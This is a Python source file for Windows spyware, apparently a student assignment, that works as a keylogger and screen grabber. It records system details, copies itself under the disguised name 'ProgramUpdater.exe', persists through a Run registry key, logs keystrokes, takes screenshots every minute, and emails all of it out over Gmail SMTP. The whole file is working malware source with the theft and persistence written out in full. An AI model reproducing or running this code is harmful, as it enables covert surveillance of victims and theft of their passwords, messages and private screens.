import os
import platform
import socket
import smtplib
import shutil
import winreg
import pyautogui
import threading
import time
from pynput.keyboard import Listener
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email import encoders

user = os.getlogin()
ossys = platform.system()
osver = platform.version()
ip = socket.gethostbyname(socket.gethostname()) 
cpu = platform.architecture()
hostname = socket.gethostname()

def mailstart():
    sender_email = os.getenv('mymail')
    receiver_email = os.getenv('rcvmail')
    password = os.getenv('mypass')

    msg = EmailMessage()
    msg['Subject'] = 'Proses Başladı'
    msg['From'] = sender_email
    msg['To'] = receiver_email
    
    with open("system_info.txt", 'r', encoding="utf-8") as file2:
        msg.set_content(file2.read())
    
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email,password)
        server.send_message(msg)

def maildata(data,subject):
    sender_email = os.getenv('mymail')
    receiver_email = os.getenv('rcvmail')
    password = os.getenv('mypass')

    msg = EmailMessage()
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = receiver_email

    with open(data, 'rb') as file3:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(file3.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(data)}')
        msg.attach(part)
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email,password)
        server.send_message(msg)

def move():
    documents = os.path.join(os.getenv("USERPROFILE"),"Documents")
    destination = os.path.join(documents,"ProgramUpdater.exe")
    if not os.path.exists(destination):
        shutil.copy("assignment-final-kamal.exe",destination)
    registry(destination)

def registry(filepath):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(regkey, "ProgramUpdater", 0, winreg.REG_SZ, filepath)
    winreg.CloseKey(regkey)

def on_press(key):
    with open("keystrokes.txt","a") as file4:
        file4.write(str(key) + "\n")

def screenshot():
    image = pyautogui.screenshot()
    image.save("screenshot.png")

def schedulescreenshot():
    while True:
        screenshot()
        maildata("screenshot.png", "Screenshot")
        os.remove("screenshot.png")
        time.sleep(60)

def schedulekeylogger():
    while True:
        time.sleep(900)
        maildata("keystrokes.txt","Keylogger")
        os.remove("keystrokes.txt")

move()

with open("system_info.txt", 'w', encoding="utf-8") as file:
    file.write(f"İstifadəçi adı: {user}\n")
    file.write(f"Əməliyyat sistemi: {ossys}\n")
    file.write(f"OS versiyası: {osver}\n")
    file.write(f"Hostname: {hostname}")
    file.write(f"İP ünvanı: {ip}\n")
    file.write(f"CPU Arxitektura: {cpu}\n")
    file.close()

with Listener(on_press=on_press) as listener:
    listener.join()

screenshot_thread=threading.Thread(target=schedulescreenshot, daemon=True)
screenshot_thread.start()
keylogger_thread = threading.Thread(target=schedulekeylogger, daemon=True)
keylogger_thread.start()
mailstart()
os.remove("system_info.txt")
